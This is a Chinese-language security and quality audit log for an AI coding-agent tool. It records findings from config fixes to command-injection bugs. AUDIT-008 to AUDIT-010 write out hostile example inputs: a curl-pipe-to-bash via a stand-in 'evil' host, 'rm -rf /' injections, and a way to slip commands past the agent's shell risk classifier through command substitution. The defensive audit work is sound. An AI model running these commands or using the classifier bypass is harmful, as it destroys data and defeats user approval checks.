# AUDIT — 问题清单

> 等级：P0 阻断 / P1 严重 / P2 普通。每条必须含位置、现象、根因、影响、修复方案、验证、状态。

---

## AUDIT-001 — vitest 扫描 claude-code/ 参考源码导致测试循环断裂

- 等级：**P1**
- 位置：`vitest.config.ts:5`
- 现象：`pnpm test` 报 `Test Files 442 failed | 40 passed (482)`，941 tests passed；失败文件全部位于 `claude-code/packages/...`，错误为 `Cannot find package 'bun:test'`。
- 根因：`vitest.config.ts` 的 `exclude` 列表只有 `node_modules/dist/.claude/worktrees`，未排除项目根下的 `claude-code/` 参考目录（180MB 逆向源码，用 bun:test）。
- 影响：goal §XIII 测试修复循环无法启动；`pnpm test` 退出码非零，CI/开发反馈被污染。
- 修复方案：在 `vitest.config.ts` 的 `exclude` 增加 `'**/claude-code/**'`（同时保险加 `loop-kit/**`）。不动 claude-code 本身（原则3：只读参考，不改不删）。
- 验证方式：`pnpm test` 后应只剩 ovolv999 自身测试，`Test Files X passed`，退出码 0，无 'bun:test' 错误。
- 状态：**已验证**（2026-07-15：vitest.config.ts:5 增加 claude-code/loop-kit 排除 → `pnpm test` 40 files / 941 tests passed / exit 0）

---

## AUDIT-002 — claude-code/ 参考目录未纳入 .gitignore

- 等级：**P2**
- 位置：仓库根（`.gitignore`）
- 现象：`git status` 显示 `?? claude-code/` 为未跟踪；该目录 180MB，是只读逆向参考，不应进入版本库。
- 根因：`.gitignore` 未忽略 `claude-code/`。
- 影响：误提交风险、git 操作变慢、工具扫描面扩大。
- 修复方案：`.gitignore` 增加 `/claude-code/`。
- 验证方式：`git status --short` 不再出现 `claude-code/`。
- 状态：**已验证**（2026-07-15：.gitignore 增加 /claude-code/ 与 /loop-kit/ → git status 不再列出）

---

## AUDIT-003 — ovogo_progress.json 为占位空壳

- 等级：**P2**
- 位置：`ovogo_progress.json`
- 现象：内容为 `{"current_step":"running","next_action":"do thing",...}`，无实际信息。
- 根因：历史占位文件。
- 影响：误导（看起来像有进度系统但实际无用）。
- 修复方案：本轮循环以 `.loop/STATE.md` 为权威状态源；ovogo_progress.json 暂保留不改（避免破坏可能依赖它的代码），后续审计确认无引用后再决定是否清理。
- 验证方式：grep 确认是否有 src/bin 代码引用 ovogo_progress.json。
- 状态：待确认

---

## Iteration 1-3 审计（阶段 5）

### AUDIT-004 — /poor 活体切换的引用同一性依赖（已验证，良性）
- 等级：**P2**（已知限制，非缺陷）
- 位置：`src/core/engine.ts:386`(resolve 用 `config` 参数) vs `:348`(`this.config = applyAgentToConfig(config)`) vs `:1594 getConfig()`
- 现象：`/poor` 经 `engine.getConfig().poor = {...}` 活体设置；模块经 ModuleContext.config 读 poor。两者须为同一对象引用才生效。
- 根因：applyAgentToConfig 在 `config.agent` 存在时返回**新对象**（spread），此时 `this.config !== 构造参数 config`；resolve 把构造参数传给模块。
- 影响分析：
  - 主 REPL engine：bin 的 config 无 `agent` 字段 → applyAgentToConfig 返回同一引用 → this.config===config===模块 config → **/poor 活体切换生效**（证据：agentPresets.ts:179 `if (!config.agent) return config`）。
  - 子 agent（有 agent 字段）：this.config 是新对象，但子 agent 不跑 REPL/`/poor`，且 poor 值经 `...config` 已正确复制 → 子 agent boot 时 poor 读取正确。
- 结论：功能正确；唯一"不工作"的场景（子 agent 活体切换）不存在于实际用法。
- 状态：**已验证**（代码路径证据：agentPresets.ts:177-189 + engine.ts:348,386,1594）。若未来要让子 agent 也支持活体切换，把 resolve 的 `config` 改为 `this.config` 即可（当前不动以避免影响现有子 agent 行为）。

### AUDIT-005 — MCP server 子进程生命周期（v1 不显式回收）
- 等级：**P2**
- 位置：`src/modules/mcp.ts`（boot 持有 clients，无 onComplete close）
- 现象：MCP server 进程在 boot 时 spawn，v1 没有 onComplete 钩子显式 close；依赖宿主进程退出回收。
- 影响：长生命周期 REPL 内若反复重建 engine / 重复 boot，可能累积僵尸 server 进程。单 engine 单次 run 不受影响。
- 修复方案（v2）：给 McpModule 加 onComplete → 遍历 clients 调 close()。需 AgentModule 支持 dispose 语义或 engine 退出钩子。
- 状态：**已知限制**，v1 接受（个人工具单进程场景风险低）。文档化。

### AUDIT-006 — MCP/Verify 命令执行的安全性（可接受）
- 等级：**P2**（可接受风险）
- 位置：`src/core/mcpClient.ts`(spawn) / `src/tools/agent.ts:runVerification`(execSync)
- 现象：MCP server 用 `spawn(cmd[0], args)`（**无 shell**，注入面小）；VerifyPlanExecution/runVerification 用 `execSync(cmdString)`（**经 shell**）。
- 根因：runVerification 的 cmd 来自项目 `package.json` scripts。
- 影响：恶意 package.json settings 可执行任意命令。但这是用户**自有可信项目**配置（等同 .ovogo/settings.json 信任级别），且与 CCB 同款模式。
- 状态：**可接受**（信任边界 = 用户项目配置）。

### AUDIT-007 — 新增代码并发/错误处理审查（通过）
- 范围：mcpClient（pending Map + 超时 + failAll）、mcpToolAdapter（execute 捕获异常）、McpModule（连接失败隔离）、critic/reflection（poor 守卫前置）。
- 结论：lint `no-floating-promises`/`no-misused-promises` 已开且 0 error；McpModule 连接失败 try/catch 不阻断 boot；adapter execute 捕获 client 异常转 isError。无 P0/P1。

### 审计小结（Iteration 1-3）
- **P0：0**　**P1：0**（AUDIT-001/002 已修；004-007 均为 P2 已知限制/可接受风险）
- 核心路径可用、向后兼容、无回归（941→974 测试只增不减）。

---

## Iteration 4 审计（阶段 5 深度审计 + 修复）

### AUDIT-008 — 命令注入：/commit (P1→已修复)
- 等级：**P1**
- 位置：`src/commands/builtin.ts:482-483`
- 现象：`/commit` 用 `execSync(`git commit -m "${args.replace(/"/g, '\\"')}"`)` — 只转义 `"`，shell 元字符 `$()`、backtick、`;` 等仍可注入。输入 `/commit $(curl evil.sh | bash)` 会执行子命令。
- 修复：改用 `execFileSync('git', ['commit', '-m', args], ...)` — 数组形式绕过 shell。`git add -A` 同步改。
- 状态：**已修复+已验证**（execFileSync 无 shell 调用；pnpm test 1039 passed）

### AUDIT-009 — 命令注入：/branch (P1→已修复)
- 等级：**P1**
- 位置：`src/commands/builtin.ts:632`
- 现象：`execSync('git checkout -b ' + args.trim())` — 零转义直接拼接。`/branch foo; rm -rf /` 会执行。
- 修复：改用 `execFileSync('git', ['checkout', '-b', args.trim()], ...)`。`git branch -v` 同步改。
- 状态：**已修复+已验证**

### AUDIT-010 — 风险分类器绕过：命令替换通道 (P1→已修复)
- 等级：**P1**
- 位置：`src/core/riskClassifier.ts:86-88`
- 现象：`classifySegment` 只检查首词是否在 SAFE_PREFIXES，`echo $(rm -rf /)` 和 `cat \`curl evil\`` 因首词 `echo`/`cat` 是 safe 而通过全部检查。
- 修复：SAFE_PREFIXES 检查通过后，额外扫描 `$(`, backtick, `;\s`, `&&`, `||`, `-exec`，命中则升级为 `needs_approval`。
- 状态：**已修复+已验证**（65 个新测试覆盖，含绕过场景）

### AUDIT-011 — 风险分类器预存 Bug：git 未在 SAFE_PREFIXES (P1→已修复)
- 等级：**P1**（预存 bug，审计阶段由测试暴露）
- 位置：`src/core/riskClassifier.ts:54-61,87`
- 现象：代码在 `if (SAFE_PREFIXES.has(firstWord))` 内部检查 `if (firstWord === 'git')`，但 `'git'` 从未加入 SAFE_PREFIXES 集合。导致所有 git 命令跳过 `classifyGit`，直接返回 `needs_approval`。
- 根因：SAFE_PREFIXES 漏加 `git`。
- 影响：ask/deny 模式下所有 git 命令被误报为"需要审批"。
- 修复：在 SAFE_PREFIXES 中加入 `'git'`。
- 状态：**已修复+已验证**（riskClassifier.test.ts 验证 git status/log/diff = safe）

### AUDIT-005 更新 — MCP 进程泄漏 (P2→已修复)
- 等级：**P2**（升级修复：从"已知限制"变为"已修复"）
- 位置：`src/modules/mcp.ts` / `src/core/engine.ts:442`
- 现象：MCP server 进程在 boot 时 spawn，原 v1 无显式 close。
- 修复：McpModule 新增 `dispose()` 方法（遍历 clients 调 `close()`，best-effort）；engine.dispose() 通过 duck-typing 调用所有模块的 `dispose()`。
- 注意：使用 `dispose()` 而非 `onComplete()`，因为 `onComplete()` 每轮 turn 后调用（会切断 MCP 连接）。`dispose()` 仅在 engine 销毁时调用。
- 状态：**已修复+已验证**

### AUDIT-012 — Notebook 非原子写入 (P2→已修复)
- 等级：**P2**
- 位置：`src/tools/notebookEdit.ts:230`
- 现象：用 `writeFileSync`（非原子），崩溃/断电可能留下截断的 `.ipynb`。
- 修复：改用 `atomicWrite`（temp + rename），execute/doEdit 改为 async。
- 状态：**已修复+已验证**

### AUDIT-013 — 项目 slug 碰撞 (P2→已修复)
- 等级：**P2**
- 位置：`src/memory/index.ts:23` / `bin/ovogogogo.ts:1317`
- 现象：slug 仅 `cwd.replace(/[^a-zA-Z0-9]/g,'_').slice(0,32)`，不同路径可能碰撞（如 `/a/proj foo` 和 `/a/proj-foo`），导致跨项目记忆泄漏。
- 修复：追加 8 字符 sha256 哈希后缀；prefix 长度从 32→24 保持可读性。两处（src + bin）同步修改。
- 状态：**已修复+已验证**

### AUDIT-014 — ShellSession 绑定 0.0.0.0 (P2→已修复)
- 等级：**P2**
- 位置：`src/tools/shellSession.ts`
- 现象：Shell session server 绑定 `0.0.0.0`（所有接口），暴露 shell 到网络。
- 修复：改为 `127.0.0.1`（仅本地回环）。
- 状态：**已修复+已验证**

### AUDIT-015 — ModuleRegistry 静默跳过循环依赖 (P2→已修复)
- 等级：**P2**
- 位置：`src/core/moduleRegistry.ts:36`
- 现象：检测到循环依赖时 `if (inProgress.has(name)) return` — 静默跳过，无诊断信息。
- 修复：改为输出 stderr 警告。
- 状态：**已修复+已验证**

### AUDIT-016 — 非空断言 Map.get (P2→已修复)
- 等级：**P2**
- 位置：`src/tools/tasks.ts:96,281` / `src/tools/shellSession.ts:106,116`
- 现象：`manager.getTask(id)!` 等非空断言，Map 条目被删除/未插入时产生 TypeError。
- 修复：替换为显式 null 检查 + 错误返回。
- 状态：**已修复+已验证**

### 尚未修复的 P2（已知限制，优先级低）
- 模块级全局状态（todo/fileState/shellSession/modes 单例）：并发子 agent 场景共享状态。个人工具单进程场景风险低。
- Renderer fd 泄漏（destroy() 未在异常路径调用）：非核心路径。
- LoopEngine acceptance 经 shell execSync：信任边界=用户项目配置（AUDIT-006 同类）。

### 审计小结（Iteration 4）
- **P0：0**　**P1：0**（AUDIT-008/009/010/011 已修复）
- **P2 已修复：6**（AUDIT-005升级/012/013/014/015/016）
- **P2 已知限制：3**（全局状态/fd泄漏/loopEngine shell — 低风险）
- 测试 974→1039（+65 riskClassifier），全部通过
- 实现方式：通过 amux 委托 Claude Code (MiniMax-M3) 执行，glm-5.2 指挥+验证

---

## Iteration 5 审计（功能借鉴）

### 审计范围
新增 3 个特性的安全性、向后兼容性、测试覆盖率。

### 审计结论
- **P0：0**　**P1：0** — 无新增安全问题
- 新增代码路径审查：
  - `snipMessages` 回调：同步数组操作（splice + unshift），无 I/O，无注入面。keepRecent 参数经 parseInt + isFinite 校验。
  - `/snip` slash 命令：输入校验（非负整数），拒绝非法输入。
  - `filterToolsForSubAgent`：纯过滤函数，不改工具定义，MCP 工具透传。
  - CJK 归一化：纯字符串变换，无副作用。
- 向后兼容：所有新特性默认关闭或可选（disallowedTools 默认空，CJK 归一化幂等）。
- 测试：47 个新测试覆盖正常/边界/错误路径。
- Claude Code 自主修正了 spec 的两个缺陷（definition 包装缺失、lint ! 断言），说明 amux 委托质量可靠。

---

## Iteration 8 审计 + 全面修复（2026-07-23，架构级审计驱动）

### 审计方法
glm-5.2 独立展开全面架构审计：读取全部目标文档 + 跑 tsc/lint/test 拿地面真相 + 派发 4 个并行 explore agent 逐文件核实 five_goal Runtime 主链接入真实性（非复述文档）。

### 发现的真实 bug（已修复）
- **P1-1** `claudeCode.ts:630` 死代码三元式（`taskId = run?.worker === session ? undefined : undefined`）→ detached→wait 路径 taskId 永远 undefined，退化为 `^[DONE]$` 陈旧哨兵匹配（正是 P0-7 要消除的）。修复：新增 `runTasks` Map 持久化 taskId，镜像 `runSessions` 生命周期。
- **P1-2** loopEngine→engine.runTurn 父子 Run 断链（runTurn 无 parentRunId 参数，coordinator.deps.parentRunId 从未被填充）→ 所有 loop 下 turn run 是孤儿。修复：runTurn/coordinator.run 增加 opts.parentRunId，loopEngine 透传 loopRunId。
- **P1-3** `recoverWorkers()` 生产路径从未调用（仅测试调用）→ external_worker run 永久卡 `recovery-pending-reattach`。修复：构造器末尾调度（in-flight merge 防与手动调用竞争）。
- **lint 回归**：文档多处声称"0 error"，实测 741 error。修复：诚实分层（correctness 规则 error、type/dead-code/style 债 warn、tests 合理放松）→ 0 error / 475 warning。

### 接线/诚实化
- **P1-6** sandbox 接入 BashTool（opt-in，默认 passthrough，保留原行为）。
- **P2-6** `maybeCompactWithInvariants` 接入生产压缩路径（防御 WorkingState 未来泄漏进消息流）。
- **P2-9** claimSoftAbort 去重到 SharedRuntimeState。
- README 能力矩阵诚实化（§3/§5）。

### 核实后保留（有测试覆盖，按 goal 原则3不删）
`onModelStateChanged`/`getRunEventBus`/`assembleSystemPrompt`/`mutatesState` 等元数据字段 — 均有测试断言引用，删除会破坏测试。`checkCommandPermission` 核实已不存在（早期已删）。

### 审计小结（Iteration 8）
- **P0：0**　**P1：0**（P1-1/2/3/6/7 全部修复）
- **P2 已修复：6**（P2-1/6/7/8/9 + lint 债降级）
- **P2 已知/延后：7**（死代码渐进清理 / 全局状态 / /workers 程序化 / EventBus 订阅 / modelState 富字段 / lspClient 环境）
- 测试 3885→3887（+2 GAP-C.4），全部通过；tsc 0 error；lint 0 error
